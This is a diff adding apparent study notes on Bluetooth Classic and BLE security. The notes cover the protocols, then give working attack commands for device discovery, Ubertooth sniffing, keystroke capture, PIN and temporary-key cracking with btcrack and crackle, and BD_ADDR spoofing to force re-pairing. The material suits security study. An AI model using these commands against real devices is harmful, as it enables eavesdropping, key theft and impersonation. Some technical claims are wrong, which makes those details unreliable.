@@ -1,0 +1,1154 @@
+Bluetooth
+
+
+
+Bluetooth Standard Revision History
+Version		Name					Transmission Rate
+1-1.2   BR (Bluetooth Basic Rate)	1Mbps
+2.0	    EDR (Enhanced Data rate)	3Mbps
+3.0		BHS	(Bluetooth High Speed)	Wi-Fi-extended
+3.X		AMP (Alternative MAC/PHY)
+4.0		BLE (Bluetooth Low Energy)	1Mbps
+
+
+Protocol Basics
+	Operates on the 2.4-GHz spectrum (same as 802.11g Wi-Fi) with Gaussian Frequency Shift Keying (BFSK) modulation
+		--hops between standard version-defined number of 1MHz-wide channels
+		Frequency Hopping Spread Spectrum (FHSS) for interference avoidance
+	Network of connected devices called a Piconet
+
+
+	Bluetooth Stack
+____________
+|Bluetooth |	PPP,IP Stack,Apps
+|Host	   |	BT Profiles (RFCOMM, BNEP, OBEX)
+|		   |	L2CAP
+------------
+	|
+	|
+	v
+HCI Link		Host-Controller Interface (HCI)
+(USB or Serial)
+	|
+	|
+	v
+____________
+|Bluetooth |	Link Manager Protocol (LMP)
+|controller|	Baseband Controller, framing
+|		   |	Radio Interface, RF Controller
+------------
+	|
+ Antenna
+	|
+	->
+	
+Radio Frequency Communications (RFCOMM)
+	-transport layer protocol for stream-based transport
+		--analogous to TCP
+	-common uses:
+		emulate serial ports
+		send AT commands (Hayes Command Set) to phones
+		trasport files over Object Exchange (OBEX) protocol
+
+Logical Link Control and Adaptation Protocol (L2CAP)
+	-datagram protocol
+		-primary use to transport high-layer protocols (RFCOMM) to other high-layer protocols
+	-can be programmed as a transport protocol
+		--analogous to UDP
+		--message-based transport
+
+Host-Controller Interface (HCI)
+	-interface for controlling bluetooth chipset
+	-link-layer protocol
+
+Link Manager Protocol (LMP)
+	--controler protocol stack inacessible without specialized hardware
+	-handles negotiation of low-level encryption, auth, pairing
+		--determines what sort of packets need to be sent and how to handle results
+
+Baseband
+	--inacessible without specialized hardware
+	-specifies over-the-air characteristics, e.g. transmission rate, final layer of packet framing and channel used for packet transmission/reception
+
+
+Bluetooth Device Address (BD_ADDR)
+	--like a MAC address, same length and format
+	-devices come with 48-bit address, formed by 3 parts:
+		Nonsignificant Address Part (NAP)
+			-first 16 bits of orgnizationally unique identifier (OUI)
+		Upper Address Part (UAP)
+			-last 8 bits of the OUI
+		Lower Address Part (LAP)
+			-24 bits used to uniquely identify a bluetooth device
+	--held in secret on bluetooth networks
+	--not transmitted in header frames to prevent eavesdropping
+	--without BD_ADDR hard to determine frequency-hopping pattern being used when initiating an attack
+
+	
+Bluetooth Profiles
+	-standards application-layer protocols
+		--define functionality and secuity mechanisms of bluetooth devices
+		Service Discovery Protocol (SDP)
+		Advanced Audio Distribution Profile (A2DP)
+		Headset Profile (HSP)
+		Object Exchange Profile (OBEX)
+		Personal Area Network Profile (PANP)
+		Secure Simple Paining (SSP)
+			--since bluetooth 2.1
+		
+	-encryption and authentication are built into the Bluetooth standard and implemented directly in Bluetooth controller chipsets
+		--encryption and/or authorization implementation is optional
+	-authentication implemented through standard pairing or Secure Simple Pairing (SSP) mechanism
+	Traditional Pairing
+		--can still be used by devices after bluetooth 2.1 SSP standardization
+		devices pairing exhcange security key ('link key')
+			link key derived from BD_ADDR, Personal Identification Number (PIN) and pseudorandom number.
+			on link key exchange completion both devices store link key information in local nonvolatile memory
+				--used for both future auth exchanges and cryptographic key derivation (where encryption is implemented)
+		--most significant problem is weak entropy pool, only source of entropy is small PIN value 
+		x-if observed, traditional pairing used to derive link key along with subsequent auth exchanges, attacking PIN selection is possible
+			x--PIN brute force attack: PIN guess made to derive possible link key
+				x-guess is validated by comparing locally-computed authentication results to those observed in legitimate exchange(s)
+				x--if link key recovered, all traffic exchanged over Bluetooth network can be decrypted and legitimate devices can be impersonated
+			x--passive-type attack
+	Secure Simple Pairing (SSP)
+		--attempt to prevent passive observers from retrieving link key
+		--provides multiple auth options for varying Bluetooth device types
+		-leverages Elliptic Curve Diffie-Hillman (ECDH) exchange for public key cryptography (pkc)
+			--allows 2 peers to exchange public keys -> derive shared secret 'DHKey'
+				--not able to reproduce shared secret by observing public key exchange
+			-link key is derived from DHKey for subsequent auth and cryptographic key derivation
+		-strong shared entropy pool available for deriving link key on both devices
+			--resolves entropy pool problem that allowed PIN brute forcing
+		supported auth mechanisms:
+			Numeric Comparison
+				-user prompt 6-digit number on both devices, manual confirmation
+			Just Works
+				-user prompt, manual confirmation, no value comparison
+				x--does not prevent/mitigate MITM attacks
+			Passkey Entry
+				-displays 6-digit number on device A, requires user enter value using second device
+				--designed for paring HID (stdin) and display (stdout) devices
+				--support dropped for BLE SSP devices
+			Out of Band (OOB)
+				-leverages secondary technology standard for exchaging auth data & derived keys
+				--e.g. NFC
+BLE Bluetooth Profiles
+	Attribute Protocol (ATT)
+		-communicates small ammounts of data over connected L2CAP channel
+			--includes device capability info exchange
+	Generic Attribute Protocol (GATT)
+		--implemented on top of ATT
+		-service for discovering, reading or writing attributes of an attribute client or server device
+		https://www.bluetooth.com/specifications/gatt/services/
+	Security Manager Protocol (SMP)
+		-exchanges security-related data between device over L2CAP channel
+	Generic Access Profile (GAP)
+		-performs device discovery, conn init, conn complete and service discovery
+Bluetooth Extended Data Rate (EDR)
+	--versions 2.X
+	--Bluetooth traditional data rate 1Mbps with Gaussian Frequency Shift Keying (GFSK) modulation
+	-data rate 2Mbps-3Mbps
+	-Diffentially-encoded Quadrature Phase Shift Keying (FQPSK)
+		--2Mbps
+	-Differential Phase Shift Keying (DFSK)
+		--3Mbps
+	<------------GFSK modulation------------>
+	-----------------------------------------
+	| Access | Header |      Payload		|
+	|  Code  |		  |						|
+	-----------------------------------------
+		--Bluetooth 1.X all fields encoded with GFSK modulation
+	-EDR traffic access code and header information still transmitted at 1Mbps GFSK
+	-transmitter switches to DQPSK/DPSK modulation after a guard and synchronization period
+		--necessary to accomodate change in modulation mechanism and data rate
+		--preservation of GFSK at beginning of frame allows legacy Bluetooth devices to detect EDR transmitter and avoid transmit collisions
+	<-GFSK modulation->		  <-----DPSK/DQPSK modulation---->
+	----------------------------------------------------------
+	| Access | Header | Guard | Sync | EDR payload | Trailer |
+	|  Code  |		  |		  |		 |			   |		 |
+	----------------------------------------------------------
+Bluetooth Low Energy (BLE)
+	--versions 4.0+
+	Longer Dwell Time
+		--devices occupy channels in frequency-hopping pattern for longer period of time
+	FHSS pattern implementation reduced to 37 data channels + 3 advertising channels (reduced from 79 1MHz-wide channels)
+	Transmit power limited to 10MHz (see Interface Power Classes farther below)
+	Configurable to operate in 5 distinct operation states:
+		Standby
+			-does not receive or transmit packets
+		Advertising
+			-regularly transmit beacon advertisements on configured advertising channel at configured rate in accordance with Beacon_Max_Interval value (commonly 1-2seconds)
+		Scanning
+			-listens on advertising channels for devices in Advertising state
+		Initiating
+			-listens for advertisements from specific devices & responds to init conn with Advertiser.
+		Connection
+			Master mode
+				-initates a connection to a specific target device
+			Slave mode
+				-accepts connection request from a master device, applies necessary authentication steps to complete conn process.
+	--uses limited payload size as part for power conservation
+Frame Configuration
+	LSB											   MSB
+	------------------------ - - - - - ---------------
+	|prea|    Access      |	  Payload	|    CRC     |
+	|mble|    Address	  |				|			 |
+	|8bit|	  32bit		  |	 2-39 bytes	|			 |
+	------------------------ - - - - - ---------------
+	Preamble
+	Access Address
+		-or Access Code
+	Payload
+		--changes depending on the access address value and state of receiving device
+	CRC
+		Cyclical Redundancy Check
+
+	LSB										L2CAP Payload								   MSB
+	---------------------------------------------------------------- - - - - -----------------
+	|  LLID  |NASN| SN | MD |Rese|       Length       |  Reserved  | Payload |		MIC		 |
+	|		 |	  |	   |    |rved|					  |			   |		 |	 (optional)  |
+	|  2bit  |1bit|1bit|1bit|1bit|		  5bit		  |	   3bit	   |0-37bytes|	   4bytes	 |
+	---------------------------------------------------------------- - - - - -----------------
+	--L2CAP link-layer payload support for retransmission, fragmentation and reassembly dropped by BLE
+	LLID
+		Logical Link Identifier
+		-indicates purpose of payload
+		0x01 - frame continuation or empty L2CAP packet
+		0x02 - start L2CAP packet
+		0x03 - Logical Link Control Packet
+	NESN
+		Next Expected Sequence Number
+		--received packet acknowledgement
+	SN
+		Sequence Number
+		-packet transmission repceipt validation
+			--acknowledgement of NESN
+	MD
+		More Data
+		-transmitter indicates to reciever bool for whether to expect more data
+	Reserved
+		--unused bits are expected to be 0
+		--ignored by recipient
+	Length
+		-length of Payload and MIC data (optional) in bytes
+	L2CAP frame example
+	LSB			Advertising Payload			       MSB
+	---------------------------------------- - - - - -
+	|  Type  |Rese|TX|RX|    Length   |Rese| Payload |
+	|	 	 |rved|  |  |			  |rved|		 |
+	|  4bit  |2bit|1b|1b|	 6bit	  |2bit|0-37bytes|
+	---------------------------------------- - - - - -
+	Type
+		-Type of payload content:
+			directed advertisement
+			broadcast advertisement
+			nonconnectable advertisement
+			advertisement solicitation scan
+			scan request
+			scan response
+			connection request
+	TX Address
+		1 - MAC address generated (for privacy)
+		0 - MAC address allocated to radio interface
+	RX Address
+		1 - MAC address generated (for privacy)
+		0 - MAC address allocated to receiver interface
+	Payload Length
+		-length of payload data (excluding header data)
+		--valid values between 0-37 (bytes)
+	Reserved
+		--unused bits are expected to be 0
+		--ignored by recipient
+BLE Security Controls
+	--attributes of Generic Access Profile (GAP)
+	--SSP implementation dropped support for Elliptic Curve Diffie-Hillman (ECDH) exchange for public key cryptography (pkc)
+	Encryption and Message Authneticity
+		AES Cipher Block Chaining-Message Authnetication Code (AES-CCM) protocol with 128-bit key
+			--analagous to 802.11 WPA2 AES-CCMP
+		Security Mode 1
+			--operates at air interface layer
+			x--does not use message authenticity check
+				x--succeptable to replay and malformed data MITM attacks
+			Mode 1, Level 1 - No encrpytion, no authentication
+			Mode 1, Level 2 - key derive from unauthenticated pairing, devices encrypt data after key derived
+			Mode 1, Level 3 - Authenticated pairing to derive a key, encrpytion follows
+		Security Mode 2
+			--operates at ATT layer
+				--provides upper-level support for data signing with integrity protection
+			Mode 2, Level 1 - Unauthenticated pairing to derive key, thereafter device-encrypted data validated using message authentication code (MAC)
+			Mode 2, Level 2 - Authenticated pairing to derive key, thereafter device-encrypted data validated using message authentication code (MAC)
+			--extends packet as below:
+			LSB		   Security Mode 2 Frame		   MSB
+			- - - - --------------------------------------
+			|Payload| Signature  |		   MAC			 |
+			|		|  Counter	 |						 |
+			|		|   4byte	 |		  8 byte		 |
+			- - - - --------------------------------------
+				Signature Counter
+					-increments for each packet transmitted
+				MAC
+					Message Authentication Code
+					-Signature Counter validated by calculating MAC
+BLE Privacy Feature
+	--intended to increase difficulty level of tracking target device over time
+	-devices use generated address in place to allocated static continuous BD_ADDRESS for a defined period of time
+	-2 types of generated addresses:
+		Resolvable Privacy Address
+			private address that can be correlated back to the static address by a device that shares encryption key
+			--client device generates a new private address for each connection while maintaining identity with peer based on static address
+		Non-Resolvable Privacy Address:
+			--does not disclose static address to the connection recipient
+			--cannot be correlated to static BD_ADDR
+		
+Attack Devices
+	--Bluetooth Classic spec defines 3 functional power classes for manufacturers producing radios
+	Bluetooth Classic Interface Power Classes:
+	Class:	Max Output:		~Range:
+		1	100mW (20dBm)	100m/328ft
+		2	2.5mW (4dBM)	10m/32.8ft
+		3	1mW (0dBm)		1m/3.28ft
+	--Bluetooth operates on 2.4ghz band (same as 802.11g), directional antennas can extend range
+	
+Recon
+Discovery
+	-identify presence of devices and reveal 48-bit BD_ADDR
+Active Discovery
+	inquiry scanning
+		--Bluetooth specification
+		-actively transmit inquiry scan messages on a set of frequencies, listening for response
+		-devices configured in discoverable mode return inquiry response revealing:
+			BD_ADDR
+			timing information - device clock (CLK)
+				-CLK not a measurement of 24hr time
+				-28-bit value incremented by 1 every 312.5 microseconds
+			device class information - type of device (phone, wearable, computer, &c)
+	Tools:
+	Windows:
+		Bluetoothview - https://www.nirsoft.net/utils/bluetooth_viewer.html
+			--GUI+CLI
+			CLI options:
+				/try_to_connect <MAC Address>
+					--Try to connect to a specific Bluetooth device. If the connect process was successful, the .exe returns 0. Otherwise, it returns error code.
+				/stext <Filename>
+					--Save the list of Bluetooth devices into a regular text file
+				/scomma <Filename>
+					--Save the list of Bluetooth devices into a comma-delimited text file (csv)
+				/sxml <Filename>
+					--Save the list of Bluetooth devices into XML file
+	iOS:
+		BLE Scanner 4.0
+			-reports device name, RSSI, UUID retrieved from GATT service
+		LightBlue Explorer
+			-discovers devices through BLE advertisements, reports signal strength information and enumerates device addtributes
+	Linux:
+		sudo apt-get install bluetooth libbluetooth3 libbtbb1 bluez-firmware firmware-atheros firmware-iwlwifi firmware-misc-nonfree firmware-realtek bluez bluez-tools bluez-test-scripts bluez-test-tools bluez-cups bluez-hcidump bluez-obexd ubertooth ussp-push redfang btscanner obexfs obexftp obex-data-server neard gnome-bluetooth kismet kismet-plugins bluesnarfer blueranger blueman bluelog bluedevil spooftooph gir1.2-gnomebluetooth-1.0
+		sudo pip3 install pyusb --upgrade
+			--install all bluetooth attack-relevant tools from repositories (kali linux)
+		BlueZ package stack
+			hcitool
+				sudo apt-get install hcitool
+				sudo hcitool scan --all --flush
+					--with --all flag toggled, capable of returning BD_ADDR, device name, device class, radio manufacturer, LMP version and feture enumeration details.
+				--not capable of continuous scanning
+				sudo hcitool lescan E3:99:D2:66:6A:C3
+					--scan for BLE devices
+					--unlike Bluetooth Classic, scans indefinitely
+				sudo hcitool lescan E3:99:D2:66:6A:C3 | sort -u | tee ble_`date '+%d-%m-%Y_%H-%M-%S'`.txt
+					--lescan shows repitiion of discovered devices, sort unique
+				sudo hcitool name E3:99:D2:66:6A:C3
+			gattool
+				--enumerates services and characteristics of a BLE device
+				--CLI or REPL interfaces
+				gattool --primary -b E3:99:D2:66:6A:C3
+					--identify privary service information of device
+					--service information returned in UUID form consistent with 16-bit GATT service numbers defined in standarard
+						--appendix at end of document
+						  Bluetooth SIG service UUID
+						 |-------------------------|
+				00001800-0000-1000-8000-00805f9b34fb
+					|-------|
+					Service-assigned number
+					--service number for example result would be 0x1800 - Generic Access Service
+				gattool -I -b E3:99:D2:66:6A:C3
+					[   ]>connect
+					[CON]>primary
+					[CON]>characteristics
+				gattool --primary -t random -b E3:99:D2:66:6A:C3
+					--flag -t random  argument necessary if randomized privacy address used by target device
+				gattool -b E3:99:D2:66:6A:C3 --characteristics
+					--identify service characteristics of target device
+				gattool -b E3:99:D2:66:6A:C3 --char-read --uid=0x2a00 | cut -d':' -f3 | sed 's/ //g/' | xxd -r
+		btscanner
+			sudo apt-get install btscanner
+			--attempts to extract as much information as possible without pairing
+			--curses-based interface
+			Hotkey		Action
+			H			Help
+			I			start active (inquiry) scanning
+			B			start brute force discovery scanning
+						--sequentially guess BD_ADDRs to discover non-discoverable devices
+							---not very stealth
+			A			abort active scan
+			S			save summary details of discovered devices in session to file
+			O			open dialog to sort devices by preferences
+			ENTER		retrieve additional information about selected device
+						--LMP information and available services
+			Q			return to menu or quit
+			--logs information to directory ~/bts/<BD_ADDR>/ for each unique BD_ADDR in two files timestamps & info
+			--no longer in active development
+Passive Discovery
+	physically look at a device
+		-for some devices part or all of their BD_ADDR information is printed on the device
+			--often the remainder of the or a limited range required to brute force discover the address can be found in documentation/manual
+		-if a visible device is clearly a bluetooth advice check the manufacturer's support page for manuals or other information that may reveal a limited BD_ADDR range for manufacturer's devices or for a specific device
+	IEEE OUI allocation list:
+		https://standards.ieee.org/regauth/oui/oui.txt
+Hybrid Discovery
+	off-by-one discovery
+		-often device addresses are incrementations relative to another address on the device and not a random assigned address
+			--iphone > settings > general > about
+				note that the BD_ADDR is the wireless adapter MAC address incremented by one
+		--note off-by-one discovery resolve by iterating a hex value, not a decimal value
+	sudo airmon-ng start wlan0 1
+	tshark -Nm -i wlan0mon -Y "wlan.fc.type_subtype eq 4" -z proto,colinfo,wlan.sa,wlan.sa
+		--scan for only probe request frames (-Y "wlan.fc.type_subtype eq 4") performing only MAC address resolution (-Nm)
+Passive Traffic Analysis (of an active piconet)
+	-Bluetooth Classic does not include BD_ADDR in frame header
+	-slave device issued unused Logical Transport Address (LT_ADDR) when device joins a piconet.
+		--logical source and destination address for device traffic
+		--3-bit field rather than 48-bit BD_ADDR field	
+		---impossible to identify BD_ADDR of active device by capturing packet and observing MAC header
+		---BD_ADDR estimable by observing other activity
+	-Bluetooth packets transmitted on piconet preceded an access code
+	access code:
+		preabmle
+		trailer
+		snyc word
+			-------------------------------------------
+			|BCH error correcting code|	   LAP	  |	  |<--Barker Sequence
+			-------------------------------------------
+					34 bits				 24 bits  3 bits
+ 			-each time master or slave device recieves a fram sync word stabalizes interface before baseband header data starts
+			-uniquely identifies traffic for a given piconet
+				--allows multiple BT networks to operate in proximity
+			consists of:
+				BCH error correcting code
+					-detects and corrects errors in received data
+				LAP (Lower Address Part)
+					-lower 24 bits of BD_ADDR
+					x-most interesting from attack perspective, contains last 3 bytes of BD_ADDR
+					--intended to allow devices in a piconet determine if traffic is intended for it
+				Barker Sequence
+					-correlates data
+					x-increases probability of packet detection
+					x-decreases probability of false negative packet detection
+	MAC-layer header
+	LSB																			MSB
+	-------------------------------------------------------------------------------
+	| LT_ADDR    |	     Type     |Flow|ARQN|SEQN|				HEC				  |
+	|   3bit     |	     4bit     |1bit|1bit|1bit|				8bit			  |
+	-------------------------------------------------------------------------------
+		LT_ADDR
+		Type
+		Flow
+		ARQN
+		SEQN
+		HEC
+			Header Error Correction (HEC) checksum
+			-simple checksum over MAC layer using UAP as an input
+			x-by collecting several frames UAP can be accurately identified without false positives
+				x--UAP is an 8-bit portion of BD_ADDR
+	x-combining UAP with LAP provices 32 bits of a 48-bit BD_ADDR
+		x--standard bluetooth devices not designed to proviced content of sync word
+		x--requires specialized (or from a perspective de-specialized hardware)
+	Ubertooth Passive Discovery
+		https://greatscottgadgets.com/ubertoothone
+		custom curcuit-board interface exposes low-level Bluetooth Classic and BLE traffic to host system of USB interface
+		setup:
+		git clone https://github.com/greatscottgadgets/libbtbb.git
+		cd libbtbb
+		mkdir build && cd build
+		cmake .. && make && sudo make install
+		cd ../..
+		git clone https://github.com/greatscottgadgets/ubertooth.git
+		cd ubertooth/host
+		mkdir build && cd build
+		cmake -DLIBUSB_INCLUDE_DIR='/usr/include/libusb-1.0/' .. && make && sudo make install
+		sudo ldconfig
+		cd ../..
+		sudo cp ubertooth/host/libubertooth/40-ubertooth.rules /etc/udev/rules.d/
+		sudo service udev restart
+		sudo groupadd usb
+		sudo usermod -aG usb $USER
+		Ubertooth commands:
+		ubertooth-util -v
+			--version information
+		ubertooth-rx
+			--disclose LAP of active Bluetooth transmitters
+			--prone to false-positives when determining UAP
+		ubertooth-scan
+			-identify the LAP and UAP of the master of a piconet
+				--preceeds eavsdropping attacks
+			--LAP recovery + NAP (Nonsignificant Address Part) verification to increase verification speed, reduce false-positives
+			--uses active scanning guess UAP, as well
+				---attack may be discovered
+			--requires both an Ubertooth One and standard Bluetooth dongle
+	-passively discovered BD_ADDR addresses can be used with hcitool commands (see above)
+Service Enumeration
+	-SDP allow identification of potential targets on a host, supported bluetooth profiles and configuration details necessary to make service connections
+	Tools:
+	sdbptool
+		--browse enumerated Name, RecHandle, Class ID List, Protocol Descriptor List and Profile Descriptor List per sevice for a device
+	sdptool browse E3:99:D2:66:6A:C3
+		--'nice' way of requesting SDP information from a device
+	sdptool records E3:99:D2:66:6A:C3
+		--probes target device for services using common variations of service-handle base values
+			--probes 384 service-record handle variants when used
+	sdptool browse E3:99:D2:66:6A:C3 --xml
+		--output sdptool information in xml format to parse markup with other tools
+	Service Name
+		--supplied by developer who implemented server (not consistent)
+	Service Description
+		--supplied by developer who implemented server (not consistent)
+	RecHandle
+		-SDP record handle associated with service
+		-32-bit value uniquely identifies service for given host
+			--unique only to the given host, difference accross multiple hosts
+		--generally each Bluetooth implementation will use a specific service record handle for each specific profile
+	Class ID List
+		-identifies specific bluetooth profile implemented for service
+		-32-bit value identifier
+	Protocol Descriptor List
+		-identifies thes supporting profiles used to provide the bluetooth service through the profile associated with the identified service class
+		--usually L2CAP is used with a Protocol Service Multiplexor (bluetooth equivelent of a port)
+		--Language Base Attr List identifies the base language for human-readable fields used in service implementation
+			--code_ISO639 denotes english language
+Bluetooth Eavesdropping
+	--Bluetooth Classic piconets are based on Frequency Hopping Spread Spectrucm (FHSS)
+	Tools:
+	Ubertooth
+		ubertooth-follow -u 43 -l a36fa0
+			-u UAP=0x43
+			-l LAP=0xa36fa0
+			--lacks sophisticated decoding interface to examine data
+	--passive eavesdropping on SSP pairing process does not reveal sufficient information for an attacker to recover a derived encryption key
+BLE Eavesdropping
+	--relatively lower complexity:
+		--fewer channels to hop (37)
+		--simpler frequency-hopping pattern based on a starting advertising channel index, hop interval and hop increment value
+	-when BLE piconet established master device sends connection request packet to slave device on one advertising channel, which discloses:
+		Access address
+			-4-byte value randomly selected by initiator, uniquely identifies connection
+		Connection event interval (hop interval)
+			-ammount of time transmitter and receiver stay on a given channel before hopping
+		Hop increment
+			distance between 2 channels, identifies next channel in frequency-hopping pattern
+		CRC initial seed
+			-3-byte random value selected by initiator, initializes packet CRC checksum calculation
+	-eavesdropping requires knowing the 4 values listed above
+	-BLE device capable of baseband sniffing can mionitor one of the 3 advertising channels to observe a connection request packet
+		--requires the sniffing device be in operation prior to thaget BLE connection being established
+	Tools:
+	Ubertooth One
+	ubertooth-btle
+		ubertooth-btle -c btle.pcap -f
+			-c save the captured packets to target pcap file
+			-f follow connection requests
+		--identifies CONNECT_REQ type packets
+		--decodes some data for each reported packet, including contents of the packet payload in the L2CAP start frame
+		ubertooth-btle -p -c btle_promiscous.pcap
+			--promiscuous mode eavesdropping
+			-p enable promiscuous mode
+		promicuous mode:
+			--promiscuous mode allows eavesdropping on btle connections that have been previously established
+			1. discovery
+			captures bitstream data representing packets and noise on single channel
+			identifies common header values for empty packets, recording 4 bytes following as possible access address to identify the beginning of a packet
+				--identifies a valid access address by counting matching values by repeating process several times
+			2. CRC initialization value recovery 
+			for packet identified by access address, CRC initialization value recovered by observing commong packet type then reversing Linear Feedback Shift Register (LFSR) calculation
+				--start with packet and CRC, then run procedure backward to recover CRC initialization value
+				--validated against subsequent packets, used to validate later packets
+			3. Hop interval recovery
+			listen on single channel and observe consecutive packets
+			delta (time difference) of two packets divided by 37 equals hop interval
+			4. Hop increment recovery
+			listen for packet on data channel, immediately hop to next channel on receipt
+			calculate hop increment when packet arrives on next channel by subtracting time difference between 2 observed packets
+	Wireshark
+		--includes support for decoding BLE packets
+		--btatt.handle display filter
+	TShark
+	tshark
+		tshark -r ble.pcap -Y "btattr.handle = 0x0011" -z "proto,colinfo,batt.value,btatt.value" | awk -F '{print "%d ", "0x"$3}'; echo
+			--limit tshark to displaying packet data frames with a specific bluetooth handle
+			-z flag - by defualt wireshark does not print BLE payload data
+BLE Eavesdropping Attacks
+	-evaluate type and nature of data sent over connection eavesdropped on to identify information disclosure vulnerabilities
+	-instances are connected through two channels (PSMs [Protocol/Service Multipexer]) on the Bluetooth L2CAP layer
+		control channel
+			-used for signaling
+		interrupt channel
+			-used for data transfer
+	Bluetooth Classic Keyboard Eavesdropping
+		-Bluetooth HID (Human Interface Device) profile defines standards requirements for sensitive i/o devices, e.g. keyboards or biometric devices
+			--security measures (auth, bonding, encryption) optional in all other HIDs
+			--host responsible for initiating security settings
+		'boot mode' specified in Bluetooth Classid HID profile
+			-dongle reverts to behaving as a simple USB HID device
+				--unencrypted link between device and host interface
+			--BIOS does not include functionality of a bluetooth host stack
+				--partially mitigated by most EUFI implementations
+		In proximity to target's system initiate packet capture
+			--apply packet type filter of "hid"
+			-per-packet, payloads can be decoded individual keystrokes
+		btaptap
+			sudo apt-get install libbtbb
+			cd `find / -type d -path '*/libbtbb/python' -name "pcaptools" 2>/dev/null`
+			./btaptap
+			python btaptap -r ble-hid.pcap
+				--will print packets in simple human readable form, breaking continuous linespacing for character line escapes (consistent with python2.6 printf() function), adding noncharacter sequences preceding newlines in format [Return]
+			--attack example specifically for a device left in boot mode
+		bt_audit
+			--bluetooth port scanner suite
+			http://www.betaversion.net/btdsd/download/
+			wget -r -np -nc -l1 http://www.betaversion.net/btdsd/download/
+			cd www.betaversion.com/btdsd/downloads
+			tar xzvf bt_audit-0.1.1.tar.gz && mkdir psm_scan && tar -C psm_scan xvzf psm_scan_v03.tar.gz
+			cd bt_audit/src && make && cd ../../
+			cd psm_scan && make
+			patch -p1 < bluez_l2cap_raw_socket.patch
+			hcitool info 00:12:34:56:78:9A
+			sdptool browse --tree 00:12:34:56:78:9A
+				--gather basic information
+			sdptool search SERVICE_NAME BD_ADDR
+				--if no browse group is available
+			rfcomm_scan -o -s 1 -e 30 00:12:34:56:78:9A | tee file.txt
+				--RFCOMM channel scan
+			psm_scan -o 00:12:34:56:78:9A
+				--L2CAP_CR_SUCCESS indicates no security layer is enabled and the connection attempt would be successful
+			psm_scan -o -s 1 -e 65535 00:12:34:56:78:9A | tee file.txt
+				--L2CAP PSM scan
+Bluetooth SSP Attacks
+	BT-NINO-MITM attack
+	-passive eavesdropping on SSP pairing process does not reveal sufficient information for an attacker to recover a derived encryption key
+	-vulnerable to MITM attacks where 2.4GHz spectrum can be jammed to force re-pairing event and force simpler resulting pairing process to use Just Works SSP auth method
+	--no publicly available tools to implement attack
+Bluetooth PIN Attacks
+	Legacy Bluetooth devices, prior to standardization of SSP ( <2.1 ), rely solely on PIN validation for auth
+		--1-16 digit pin validated by both devices
+		--PIN often set statically
+Bluetooth Classic Pin Attacks
+	-128-bit link key derived from 2 devices pairing used to identify claimant device and encrypt traffic (key derivation)
+	--observed pairing exchange can be brute-forced against PIN selection
+	-values necessary to crack PIN:
+		IN_RAND
+			-sent initiator to responder
+				--initiator is usually master device, responder usually slave device
+		COMB_KEY
+			--need to recover 2 values
+			--one sent from each device
+		AU_RAND
+			-sent from auth claimant
+				--mutual authentication, both devices act as auth claimaint once
+		SRES (Signed Responses)
+			-sent from auth verifier
+				--mutual authentication, both devices act as auth claimaint once
+		--in mutual authentication either exchange is sufficient for purpose of this attack, knowing BD_ADDR (for both master or slave) is necessary though
+			--BD_ADDR is not transmitted as part of device pairings
+	-full BD_ADDR device information necessary to crack PIN
+		--knowing LAP and UAP not sufficient, must have correct NAP value
+		-if devices are in discoverable mode hcitool can be used to recover BD_ADDR
+		-if devices are not discoverable packet capture can reveal BD_ADDR information in FHS (Frequency Hop Synchronization) frames sent during connection establishment process
+			--reveal master BD_ADDR during connection establishment
+			--reveal slave BD_ADDR of devices switch roles
+			--simply concatenate NAP, UAP and LAP values from FHS frame
+	Tools:
+	Windows:
+	BTCrack OSS
+		git clone https://github.com/mikeryan/btcrack.git && cd btcrack && make && sudo make install
+		--version of BTCrack, from which BTCrack OSS was derived, is available for Win
+		--requires Ubertooth hardware
+		./btcrack
+		btcrack <#threads> <master addr> <slave addr> <filename.csv>
+		btcrack <#threads> <master addr> <slave addr> <in_rand> <comb_master> <comb_slave> <au_rand_m> <au_rand_s> <sres_m> <sres_s>
+			--for optimal performace allocate threads equal to the number of CPU core threads available on host
+			--if slave initiates pairing alter syntax so master value precedes slave value for each field
+BLE PIN Attacks
+	-attack vector targets PK, Bluetooth Classic PINs are not used by BLE
+	--attacks against SSP protocol methods
+	-offline TK (Temporary Key) brute force attack vector against Just Works and Numberic Entry pairing methods
+	Tools:
+	crackle
+		git clone https://github.com/mikeryan/crackle.git && cd crackle && make && sudo make install
+		crackle -i <input.pcap> [-o <output.pcap>] [-l <ltk>] [-s]
+		crackle -i ble_pairing.pcap
+			-recover TK (Temporary Key)
+				--pcap must include entire pairing process
+		crackle -i ble_pairing.pcap -o ble_pairing_dec.pcap
+			-o output flag value necessary to decrpyt and output plaintext data
+		crackle -p ble_pairing.pcap -o ble_pairing_dec.pcap -l 7f11d010a01b5ba363c5d997a666dec
+			-executing crackle with a recovered LTK key value for flag -l can decrypt future packets following SSP key exchange
+				--ble does not implement ECDH for public key cryptography
+		--only effective when pairing exchange capture or LTK is otherwise known
+Practical Pair Cracking
+	-Bluetooth Classic & BLE attacks limited to capturing device pairing
+	-attacking piconets that have already been paired  requires forcing devices to re-pair
+Re-Pairing Attack
+	-impersonate BD_ADDR of one of two paired devices in piconet to manipulate stored pairing status
+	-set BD_ADDR to value of target device, attempt connection with device paired to target
+		--connection attempt will fail without knowing link key/LTK exchanged during initial pairing
+		--most devices invalidate previously stored link key(Bluetooth Classic)/LTK(BLE) for impersonated BD_ADDR
+		--attempt to reconnect (often automatic) will fail, prompting user to re-pair
+			--assuming user re-pairs the PIN/LTK can be captured and cracked
+	attack requires:
+		CSR Bluetooth Interface
+			-change BD_ADDR address using Linux bdaddr utility
+				https://raw.githubusercontent.com/nccgroup/BLESuite/master/tools/bdaddr.c
+		Master BD_ADDR
+			--previously paired device, in rare cases may be slave
+			-BD_ADDR attack will use to impersonate device breaking initial pairing
+		Target BD_ADDR
+			-BD_ADDR of target (usually slave) device to send invalid packet with BD_ADDR of paired device to
+		Bluetooth Packet Capture
+			-capture subsequent pairing exchange
+			--ubertooth one
+	bdaddr
+	wget https://raw.githubusercontent.com/nccgroup/BLESuite/master/tools/bdaddr.c
+	gcc -o bdaddr -lbluetooth bdaddr.c
+	./bdaddr
+	bdaddr [-i <dev>] [new bdaddr]
+	hciconfig hci0
+	sudo bdaddr -i hci0 00:00:FA:CE:4B:CD
+	sudo bccmd warmreset
+	hciconfig hci0
+	sudo hcitool cc E1:AF:2C:11:7E:A5
+	sudo hcitool enc E1:AF:2C:11:7E:A5 enable
+	sudo bccmd -d hci0 coldreset
+	hciconfig hci0
+Device Identity Manipulation
+	-Bluetooth interface devices use sevice and class identifiers
+		--24-bit field known as Class of Device/Service filed
+		
+		-----------------------------------------------------
+		|	Service Classes		|	Major	|	Minor   |0 0|
+		|						|   Device	|	Device	|	|
